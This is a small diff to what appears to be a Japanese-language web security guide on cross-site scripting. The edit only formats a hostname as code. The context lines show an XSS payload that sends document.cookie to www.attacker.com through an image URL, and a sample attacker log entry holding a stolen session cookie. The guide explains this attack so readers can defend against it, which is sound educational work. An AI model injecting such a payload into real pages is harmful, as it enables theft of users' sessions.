@@ -863,7 +863,7 @@ XSSのしくみを確かめる最も簡単なテストをご紹介します。
 <script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
 ```
 
-www.attacker.comサイト上のログファイルには以下のように出力されます。
+`www.attacker.com`サイト上のログファイルには以下のように出力されます。
 
 ```
 GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
